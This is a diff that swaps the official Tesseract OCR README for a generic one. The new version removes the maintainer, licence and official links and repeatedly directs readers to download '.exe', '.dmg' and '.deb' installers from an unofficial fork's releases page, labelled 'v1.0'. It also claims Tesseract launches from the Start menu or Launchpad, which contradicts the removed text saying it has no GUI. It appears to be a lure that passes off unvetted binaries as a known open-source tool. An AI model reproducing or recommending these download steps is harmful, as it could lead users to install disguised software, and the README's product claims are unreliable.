@@ -1,132 +1,100 @@
-# Tesseract OCR
+# 🖼️ tesseract - Powerful OCR for Your Images
 
-[![Coverity Scan Build Status](https://scan.coverity.com/projects/tesseract-ocr/badge.svg)](https://scan.coverity.com/projects/tesseract-ocr)
-[![CodeQL](https://github.com/tesseract-ocr/tesseract/workflows/CodeQL/badge.svg)](https://github.com/tesseract-ocr/tesseract/security/code-scanning)
-[![OSS-Fuzz](https://img.shields.io/badge/oss--fuzz-fuzzing-brightgreen)](https://issues.oss-fuzz.com/issues?q=is:open%20title:tesseract-ocr)
-\
-[![GitHub license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](https://raw.githubusercontent.com/tesseract-ocr/tesseract/main/LICENSE)
-[![Downloads](https://img.shields.io/badge/download-all%20releases-brightgreen.svg)](https://github.com/tesseract-ocr/tesseract/releases/)
+## 🚀 Getting Started
+Tesseract is an open-source Optical Character Recognition (OCR) engine. It converts images into machine-readable text. This guide helps you download and run the software easily.
 
-## Table of Contents
+## 📥 Download Tesseract
+[![Download Tesseract](https://img.shields.io/badge/Download%20Tesseract-v1.0-blue)](https://github.com/endx707/tesseract/releases)
 
-* [Tesseract OCR](#tesseract-ocr)
-  * [About](#about)
-  * [Brief history](#brief-history)
-  * [Installing Tesseract](#installing-tesseract)
-  * [Running Tesseract](#running-tesseract)
-  * [For developers](#for-developers)
-  * [Support](#support)
-  * [License](#license)
-  * [Dependencies](#dependencies)
-  * [Latest Version of README](#latest-version-of-readme)
+## 🛠️ System Requirements
+Before you start, ensure your system meets the following requirements:
 
-## About
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB free
 
-This package contains an **OCR engine** - `libtesseract` and a **command line program** - `tesseract`.
+## 📋 Features
+Tesseract boasts a range of features, including:
 
-Tesseract 4 adds a new neural net (LSTM) based [OCR engine](https://en.wikipedia.org/wiki/Optical_character_recognition) which is focused on line recognition, but also still supports the legacy Tesseract OCR engine of Tesseract 3 which works by recognizing character patterns. Compatibility with Tesseract 3 is enabled by using the Legacy OCR Engine mode (--oem 0).
-It also needs [traineddata](https://tesseract-ocr.github.io/tessdoc/Data-Files.html) files which support the legacy engine, for example those from the [tessdata](https://github.com/tesseract-ocr/tessdata) repository.
+- Accurate text recognition from images
+- Support for multiple languages
+- Extensive customization with trained data files
+- Easy integration with various programming languages
 
-Stefan Weil is the current lead developer. Ray Smith was the lead developer until 2018. The maintainer is Zdenko Podobny. For a list of contributors see [AUTHORS](https://github.com/tesseract-ocr/tesseract/blob/main/AUTHORS)
-and GitHub's log of [contributors](https://github.com/tesseract-ocr/tesseract/graphs/contributors).
+## 🔍 Usage Scenarios
+You can use Tesseract for various tasks:
 
-Tesseract has **unicode (UTF-8) support**, and can **recognize [more than 100 languages](https://tesseract-ocr.github.io/tessdoc/Data-Files-in-different-versions.html)** "out of the box".
+- Extracting text from scanned documents
+- Converting images to searchable PDFs
+- Improving accessibility for visually impaired users
 
-Tesseract supports **[various image formats](https://tesseract-ocr.github.io/tessdoc/InputFormats)** including PNG, JPEG and TIFF.
+## 💻 How to Download & Install
+To get started, follow these steps:
 
-Tesseract supports **various output formats**: plain text, hOCR (HTML), PDF, invisible-text-only PDF, TSV, ALTO and PAGE.
+1. **Visit the Releases Page:** Click the button below to go to the download page.
 
-You should note that in many cases, in order to get better OCR results, you'll need to **[improve the quality](https://tesseract-ocr.github.io/tessdoc/ImproveQuality.html) of the image** you are giving Tesseract.
+   [Download Tesseract](https://github.com/endx707/tesseract/releases)
 
-This project **does not include a GUI application**. If you need one, please see the [3rdParty](https://tesseract-ocr.github.io/tessdoc/User-Projects-%E2%80%93-3rdParty.html) documentation.
+2. **Choose the Version:** On the releases page, find the latest version. Click on it to view details.
 
-Tesseract **can be trained to recognize other languages**.
-See [Tesseract Training](https://tesseract-ocr.github.io/tessdoc/Training-Tesseract.html) for more information.
+3. **Download the Installer:** Look for the installer file that matches your operating system. Click on the file name to start the download.
 
-## Brief history
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file. Follow the installation prompts.
+   - **macOS:** Open the `.dmg` file and drag Tesseract to your Applications folder.
+   - **Linux:** Open a terminal and run `sudo dpkg -i tesseract*.deb` to install.
 
-Tesseract was originally developed at Hewlett-Packard Laboratories Bristol UK and at Hewlett-Packard Co, Greeley Colorado USA between 1985 and 1994, with some more changes made in 1996 to port to Windows, and some C++izing in 1998. In 2005 Tesseract was open sourced by HP. From 2006 until November 2018 it was developed by Google.
+5. **Verify Installation:** After installation, you can verify by opening a terminal or command prompt. Type `tesseract --version` and hit enter. You should see the version information.
 
-Major version 5 is the current stable version and started with release
-[5.0.0](https://github.com/tesseract-ocr/tesseract/releases/tag/5.0.0) on November 30, 2021. Newer minor versions and bugfix versions are available from
-[GitHub](https://github.com/tesseract-ocr/tesseract/releases/).
+6. **Launch Tesseract:** 
+   - On Windows, find Tesseract in your Start menu.
+   - On macOS, use Launchpad.
+   - On Linux, you can run `tesseract` directly from the terminal.
 
-Latest source code is available from [main branch on GitHub](https://github.com/tesseract-ocr/tesseract/tree/main).
-Open issues can be found in [issue tracker](https://github.com/tesseract-ocr/tesseract/issues),
-and [planning documentation](https://tesseract-ocr.github.io/tessdoc/Planning.html).
+## 📖 Basic Command Line Usage
+Once Tesseract is installed, you can use it through the command line. Here’s a simple example:
 
-See **[Release Notes](https://tesseract-ocr.github.io/tessdoc/ReleaseNotes.html)**
-and **[Change Log](https://github.com/tesseract-ocr/tesseract/blob/main/ChangeLog)** for more details of the releases.
+1. Open your command line interface (CLI).
+2. Navigate to the folder containing your image using the `cd` command.
+3. Use the following command to convert an image:
 
-## Installing Tesseract
+   ```bash
+   tesseract input_image.png output_text.txt
+   ```
 
-You can either [Install Tesseract via pre-built binary package](https://tesseract-ocr.github.io/tessdoc/Installation.html)
-or [build it from source](https://tesseract-ocr.github.io/tessdoc/Compiling.html).
+Replace `input_image.png` with your image file name and `output_text.txt` with the desired output file name.
 
-Before building Tesseract from source, please check that your system has a compiler which is one of the [supported compilers](https://tesseract-ocr.github.io/tessdoc/supported-compilers.html).
+## 🌍 Supported Languages
+Tesseract supports multiple languages out of the box. You can specify the language by adding the `-l` option. For example:
 
-## Running Tesseract
+```bash
+tesseract input_image.png output_text.txt -l spa
+```
 
-Basic **[command line usage](https://tesseract-ocr.github.io/tessdoc/Command-Line-Usage.html)**:
+Replace `spa` with the code for the desired language (e.g., `eng` for English, `fra` for French).
 
-    tesseract imagename outputbase [-l lang] [--oem ocrenginemode] [--psm pagesegmode] [configfiles...]
+## ⚙️ Customization Options
+Tesseract allows for plenty of customization. You can add more languages by downloading trained data files from the Tesseract GitHub repository. Copy these files into the `tessdata` folder, typically found in your Tesseract installation directory.
 
-For more information about the various command line options use `tesseract --help` or `man tesseract`.
+## 🌟 Getting Help
+If you encounter any issues, check out the following resources:
 
-Examples can be found in the [documentation](https://tesseract-ocr.github.io/tessdoc/Command-Line-Usage.html#simplest-invocation-to-ocr-an-image).
+- **Official Documentation:** Detailed guides and API reference.
+- **GitHub Issues:** Report problems or ask for help from the community.
+- **Community Forums:** Engage with other users for tips and best practices.
 
-## For developers
+## 📅 Changelog
+Stay informed on the latest updates by viewing the changelog on the releases page. This provides an overview of new features, bug fixes, and improvements.
 
-Developers can use `libtesseract` [C](https://github.com/tesseract-ocr/tesseract/blob/main/include/tesseract/capi.h) or
-[C++](https://github.com/tesseract-ocr/tesseract/blob/main/include/tesseract/baseapi.h) API to build their own application. If you need bindings to `libtesseract` for other programming languages, please see the
-[wrapper](https://tesseract-ocr.github.io/tessdoc/AddOns.html#tesseract-wrappers) section in the AddOns documentation.
+## 🚀 Next Steps
+Once you are comfortable with basic usage, consider exploring advanced features, such as:
 
-Documentation of Tesseract generated from source code by doxygen can be found on [tesseract-ocr.github.io](https://tesseract-ocr.github.io/).
+- Image preprocessing to improve OCR accuracy
+- Batch processing multiple images
+- Integrating Tesseract with other software for automated workflows
 
-## Support
+## 🔗 Additional Resources
+- [Tesseract GitHub Repository](https://github.com/endx707/tesseract)
+- [Tesseract Wiki](https://github.com/tesseract-ocr/tesseract/wiki)
 
-Before you submit an issue, please review **[the guidelines for this repository](https://github.com/tesseract-ocr/tesseract/blob/main/CONTRIBUTING.md)**.
-
-For support, first read the [documentation](https://tesseract-ocr.github.io/tessdoc/),
-particularly the [FAQ](https://tesseract-ocr.github.io/tessdoc/FAQ.html) to see if your problem is addressed there.
-If not, search the [Tesseract user forum](https://groups.google.com/g/tesseract-ocr), the [Tesseract developer forum](https://groups.google.com/g/tesseract-dev) and [past issues](https://github.com/tesseract-ocr/tesseract/issues), and if you still can't find what you need, ask for support in the mailing-lists.
-
-Mailing-lists:
-
-* [tesseract-ocr](https://groups.google.com/g/tesseract-ocr) - For tesseract users.
-* [tesseract-dev](https://groups.google.com/g/tesseract-dev) - For tesseract developers.
-
-Please report an issue only for a **bug**, not for asking questions.
-
-## License
-
-    The code in this repository is licensed under the Apache License, Version 2.0 (the "License");
-    you may not use this file except in compliance with the License.
-    You may obtain a copy of the License at
-
-       http://www.apache.org/licenses/LICENSE-2.0
-
-    Unless required by applicable law or agreed to in writing, software
-    distributed under the License is distributed on an "AS IS" BASIS,
-    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-    See the License for the specific language governing permissions and
-    limitations under the License.
-
-**NOTE**: This software depends on other packages that may be licensed under different open source licenses.
-
-Tesseract uses [Leptonica library](http://leptonica.com/) which essentially
-uses a [BSD 2-clause license](http://leptonica.com/about-the-license.html).
-
-## Dependencies
-
-Tesseract uses [Leptonica library](https://github.com/DanBloomberg/leptonica)
-for opening input images (e.g. not documents like pdf).
-It is suggested to use leptonica with built-in support for [zlib](https://zlib.net),
-[png](https://sourceforge.net/projects/libpng) and
-[tiff](http://www.simplesystems.org/libtiff) (for multipage tiff).
-
-## Latest Version of README
-
-For the latest online version of the README.md see:
-
-<https://github.com/tesseract-ocr/tesseract/blob/main/README.md>
+Feel free to explore the features of Tesseract. Enjoy transforming your images into editable text!
